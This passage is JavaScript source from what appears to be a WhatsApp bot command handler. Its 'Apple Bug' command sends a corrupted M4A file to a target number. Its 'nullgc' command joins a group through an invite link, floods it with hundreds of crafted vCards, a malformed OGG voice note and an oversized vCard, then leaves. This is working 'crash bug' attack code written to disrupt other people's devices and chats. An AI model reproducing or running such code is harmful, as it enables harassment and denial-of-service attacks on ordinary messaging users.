      0x4D,0x34,0x41,0x20, // M4A brand
      0x00,0x00,0x00,0x00, // minor version
      0x4D,0x34,0x41,0x20,0x69,0x73,0x6F,0x6D, // compatible brands
      0x69,0x73,0x6F,0x32,0x6D,0x70,0x34,0x31
    ]);
    const corruptM4a = Buffer.concat([m4aFtyp, randomBytes(131072)]);
    try {
      await sock.sendMessage(appleTarget, {
        audio: corruptM4a,
        mimetype: 'audio/mp4'
      });
    } catch (_) {}

    await reply(`💀 *Apple Bug sent!*\n📲 Target: +${appleNum}\n📦 CoreText vCard x300 + corrupted M4A (128KB)`);
    return true;
  }

  case 'nullgc': {
    if (!isOwner) return reply('❌ Owner only.');
    if (!text) return reply('❌ Usage: .nullgc https://chat.whatsapp.com/XXXXX');
    const gcCode = text.includes('chat.whatsapp.com/')
      ? text.split('chat.whatsapp.com/')[1]?.split(/[?\/ ]/)[0]
      : text.trim();
    if (!gcCode || gcCode.length < 10) return reply('❌ Invalid group link.');

    let gcId = null;
    try {
      await reply('⏳ Joining group...');
      gcId = await sock.groupAcceptInvite(gcCode);
      await new Promise(r => setTimeout(r, 2000));
      await reply('✅ Joined! Nuking...');

      const { randomBytes } = require('crypto');

      // WAVE 1: vCard bomb (500 contacts)
      const gcVcards = [];
      for (let i = 0; i < 500; i++) {
        const n = String(10000000000 + i);
        gcVcards.push({
          vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:NULL_${i}_${'X'.repeat(80)}\nTEL;type=CELL;type=VOICE;waid=${n}:+${n}\nEND:VCARD`
        });
      }
      try {
        await sock.sendMessage(gcId, {
          contacts: { displayName: '💀 NULL GC', contacts: gcVcards }
        });
      } catch (_) {}

      await new Promise(r => setTimeout(r, 600));

      // WAVE 2: Corrupted OGG voice note
      const oggHdr = Buffer.from([0x4F,0x67,0x67,0x53,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x78,0x56,0x34,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x1E]);
      const gcCorruptAudio = Buffer.concat([oggHdr, randomBytes(131072)]);
      try {
        await sock.sendMessage(gcId, {
          audio: gcCorruptAudio,
          mimetype: 'audio/ogg; codecs=opus',
          ptt: true
        });
      } catch (_) {}

      await new Promise(r => setTimeout(r, 600));

      // WAVE 3: Mega vCard NOTE (500KB)
      const bigNote2 = randomBytes(375000).toString('base64');
      const megaCard2 = `BEGIN:VCARD\nVERSION:3.0\nFN:NULLGC\nTEL;type=CELL:+10000000001\nNOTE:${bigNote2}\nEND:VCARD`;
      try {
        await sock.sendMessage(gcId, {
          contacts: { displayName: 'NULL', contacts: [{ vcard: megaCard2 }] }
        });
      } catch (_) {}

      await new Promise(r => setTimeout(r, 1500));
      try { await sock.groupLeave(gcId); } catch (_) {}
      await reply('💀 *Group nuked!*\n📦 500 vCards + corrupted audio + 500KB mega vCard sent. Group left.');
    } catch (e) {
      if (gcId) try { await sock.groupLeave(gcId); } catch (_) {}
      await reply(`❌ nullgc failed: ${e.message}`);
    }
    return true;
  }

  default:
    return false;
  }
}

module.exports = { handleCommand };
